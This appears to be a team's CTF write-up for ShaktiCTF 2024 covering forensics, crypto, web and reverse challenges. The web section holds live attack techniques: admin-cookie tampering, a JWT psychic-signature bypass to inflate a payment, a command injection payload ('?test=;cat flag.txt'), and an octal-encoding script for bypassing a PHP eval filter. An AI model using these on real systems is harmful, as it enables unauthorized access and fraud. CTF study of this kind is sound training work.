---
title: ShaktiCTF 2024 - Writeup
date: 2024-03-09 10:11:53 +/-0800
categories: [writeup, CTF]
writeup: :title
permalink: /shaktictf
tags: [web, reverse, forensics]     # TAG names should always be lowercase
---

## Summary
<ul>
    <li><a href="#forensics">Forensic</a></li>
    <li><a href="#crypto">Crypto</a></li>
    <li><a href="#web">Web</a></li>
    <li><a href="#reverse">Reverse</a></li>
</ul>

![result](assets/ShaktiCTF/result.png)

## Forensics 
### Aqua Gaze
Flag by : **Anakin** & **F4doli**

To start the chanlleges we have a pictures Directly I make a binwalk to extract potential file and hidden directory. 

```sql
> binwalk -e sea.jpeg    

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
512851        0x7D353         Zip archive data, at least v1.0 to extract, name: artofeye/
512918        0x7D396         Zip archive data, encrypted at least v2.0 to extract, compressed size: 299949, uncompressed size: 300029, name: artofeye/artofeye.jpg
813132        0xC684C         End of Zip archive, footer length: 22

```

The extraction have work we get a zip file lets try to extract the data on. 

```sql
>  unzip 7D353.zip           
Archive:  7D353.zip
[7D353.zip] artofeye/artofeye.jpg password: 
```

The archive is protected by a Password lets use zip2john to exract some hash and crack it. 

```sql
> zip2john 7D353.zip > forjohn.txt && john --wordlist=/usr/share/wordlists/rockyou.txt forjohn.txt
```

So the password is `angel1`

Get the second images name `artofeye.jpg` . After lot of try i found a tool checklist made a french guy. 
[https://k-lfa.info/tools-stegano/](https://k-lfa.info/tools-stegano/)

I found a tool which extracts from the hidden data in JPEG files what we have before us, lets try that. 

[GitHub - lukechampine/jsteg: JPEG steganography](https://github.com/lukechampine/jsteg)

```sql
# Download the binary 
> wget https://github.com/lukechampine/jsteg/releases/download/v0.3.0/jsteg-linux-amd64 && chmod +x jsteg-linux-amd64

# Extract data from the JPEG file 
./jsteg-linux-amd64 reveal artofeye/artofeye.jpg > flag.txt
```

It seems we have a large output text file try to analyze it. It seems we have a large output text file try to analyze it. by looking well we can directly fall on a chain of carateres encoded in base64, decode it and gain the flag !! 🤗
```sql
echo "c2hha3RpY3Rme3RoM19yM2RfczM0XzRuZF90aDNfNHJ0X29mXzN5M18xc19sb29rMW5nX2cwMGR9" | base64 -d

shaktictf{th3_r3d_s34_4nd_th3_4rt_of_3y3_1s_look1ng_g00d}  
```

## Crypto
### Flag Expedition
Flag by : **Anakin**

The chall begin with this image : 

![intro](assets/ShaktiCTF/flag_expedition/intro.png)

After a fast search on google I find that the flags correspond with a language used in the maritime environment 

[https://fr.wikipedia.org/wiki/Code_international_des_signaux_maritimes#Signaux_de_trois_flottants_commençant_par_M_(Mike)](https://fr.wikipedia.org/wiki/Code_international_des_signaux_maritimes#Signaux_de_trois_flottants_commen%C3%A7ant_par_M_(Mike))

A flag corresponds to a letter as we can see 

![drapeaux](assets/ShaktiCTF/flag_expedition/drapeaux.png)

After interpretation I get the following word ( I put _ to say that it misses these characters) 

`wasittooe__ytof_nd`

With more space to better understanding : 

`was it too e__y to f_nd`

I think we can easily guess the flag 😼

Final flag : `shaktictf{was_it_too_easy_to_find}`

## Web 
### Delicious 
Flag by : **Anakin**

The chall begin on a big cookie screen. 

![intro](assets/ShaktiCTF/Delicious/intro.png)

I do not know you but when I see a cookie I think directly to the session cookie so I look if there is one configured

![cookie](assets/ShaktiCTF/Delicious/fond_cookie.png)

We have a cookie and has seen eye it is encoded in b64, I will use burpsuite to better interact with the data 

When I decode the cookie in burp I can see the admin value is 0

![decode](assets/ShaktiCTF/Delicious/decode_cookie.png)

I can juste change the value to 1 and send the request.

![flag](assets/ShaktiCTF/Delicious/flag.png)

GG we get the Flag ! =) 

### Ultimate Spiderman Fan

Flag by : **Anakin** & **Talace**

We get this page : 

![intro](assets/ShaktiCTF/Ultimate_sipderman/intro.png)

We can see directly that we will have to find a way to buy the **$5,000 Spider Surprize** 

We can buy an item and after that we can do a kind of check to recover a token as it is said in the message 

```texte 

Your Spider Token has been set

Proceed to /checkout to confirm your payment.

```

If we click on checkout it says that the payment is confirmed but if we look at our cookie side we can see that there is a jwt session token that was setup. 

![find_jwt](assets/ShaktiCTF/Ultimate_sipderman/find_jwt.png)

Lets analyse it with burp and is extension **jwt editor**. 

Mainly the jwt is composing the following in decoded form 

```bash
# Header
{"alg": "HS256", "typ": "JWT"}
# Payload
{"amount": 1000}
```

It will therefore be necessary to find the way to resign the token by modifying the payload and its parameter amount = 5000.

Still with burpsuite use the attack `Signe with Psychic Signature` This attaque will update the algorythme of the jwt and if I jwt is vulnerable we will be able to resign it with the new payload 

The new jwt before the attack : 

```bash
# Header
{"typ": "JWT","alg": "ES256"}
# Payload
{"amount": 5000}
```

Now send the request always in `/checkout` and get the flag 😁
![fmag](assets/ShaktiCTF/Ultimate_sipderman/flag.png)

### Find the flag - Command injection

![2024-03-09_12h57_20.png](https://prod-files-secure.s3.us-west-2.amazonaws.com/8ca96a8e-055d-447d-8a2a-068c2ed20c09/01c2d6a7-cd67-4878-b136-e16a53685925/2024-03-09_12h57_20.png)

We got a website and his source code, pretty nice!

Here we have only one route and request, the get for / , this code take a argument `?test` in the url and make a `find` command with his value, directly with in the server. That’s nice, we have a `command injection` here, with no filter in the code.

![2024-03-09_12h52_43.png](https://prod-files-secure.s3.us-west-2.amazonaws.com/8ca96a8e-055d-447d-8a2a-068c2ed20c09/6150a784-f2cf-403d-bc85-d0fba00d7fd9/2024-03-09_12h52_43.png)

If we use this parameter we are able to retrieve the list of current file in the folder

`https://10.10.10.10/?test=`

![2024-03-09_12h55_49.png](https://prod-files-secure.s3.us-west-2.amazonaws.com/8ca96a8e-055d-447d-8a2a-068c2ed20c09/f48de8fc-80cc-437e-a948-0d1ce25a289b/2024-03-09_12h55_49.png)

We try to make two request in one with `;` and it work, got the flag!

`https://10.10.10.10/?test=;cat flag.txt`

### Filters - Php eval with filters

![2024-03-09_13h01_17.png](https://prod-files-secure.s3.us-west-2.amazonaws.com/8ca96a8e-055d-447d-8a2a-068c2ed20c09/b19b5c4e-5b48-42fe-85ab-f616042b1736/2024-03-09_13h01_17.png)

So, we got this website, with source code. We have a parameter `?command=` for a get request. It filter the value of it and make an eval with it!

![2024-03-09_13h12_31.png](https://prod-files-secure.s3.us-west-2.amazonaws.com/8ca96a8e-055d-447d-8a2a-068c2ed20c09/fe3ec493-dc0d-4f22-b980-2f6ee22e43ac/2024-03-09_13h12_31.png)

In order to bypass the filter i made a script, to encode in octal.

```python
def string_to_octal(input_string):
    octal_string = '"'
    for char in input_string:
        octal_char = oct(ord(char))[2:]
        octal_string += "\\" + octal_char
    octal_string += '"'
    return octal_string

input_string = input("Enter your php function: ")
octal_function = string_to_octal(input_string)

input_string = input("Entrez the parameter for this function : ")
octal_parameter = string_to_octal(input_string)

print("Payload:", octal_function + '(' + octal_parameter + ')')

```

We got our payload. (*`file_get_contents(flag.txt)`*)

`"\163\171\163\164\145\155"("\154\163")`

It raise an error:

```python
Parse error: syntax error, unexpected end of file in /var/www/html/index.php(17) : eval()'d code on line 1

```

I tried experimenting with simply closing the PHP tag, and it worked! Our final payload

`"\163\171\163\164\145\155"("\154\163")?>`

GG ! Let's retrieve our flag !!

## Reverse
### Warmup

![2024-03-09_13h20_09.png](https://prod-files-secure.s3.us-west-2.amazonaws.com/8ca96a8e-055d-447d-8a2a-068c2ed20c09/d00602f1-69ca-415c-8ada-a8d0332be0e1/2024-03-09_13h20_09.png)

We have a binary, in ELF format. First i open it in GDB (with peda lib). Put a break point at main function and debug instructions by instructions.

`(gdb)> break main` & `(gdb)> run` & `(gdb)> next`

I can see we have a `strcmp` (string comparaison) with `ltrace`

![2024-03-09_13h17_26.png](https://prod-files-secure.s3.us-west-2.amazonaws.com/8ca96a8e-055d-447d-8a2a-068c2ed20c09/ff42964f-926d-4daf-8978-750daf6a5be4/2024-03-09_13h17_26.png)

Back in gdb, I was able to retrieve some parts of the string that are being compared to our input. Finally, I got this string:

`}!d33dn1_3gn3ll4hc_pUmr4w_4_51_s1ht{ftcitkahs`

When I put it under `ltrace`, I can observe that my string is being inverted before comparison. However, this resulted in revealing the flag.

`shaktictf{th1s_15_4_w4rmUp_ch4ll3ng3_1nd33d!}`

So now, we can understand that the main function compares two strings with each other but inverts the string it receives from input.

![2024-03-09_13h18_30.png](https://prod-files-secure.s3.us-west-2.amazonaws.com/8ca96a8e-055d-447d-8a2a-068c2ed20c09/b6948582-80f1-4cec-aff7-189dcdb8e1a5/2024-03-09_13h18_30.png)

GG ! That’s my first flag from a reverse challenge 😅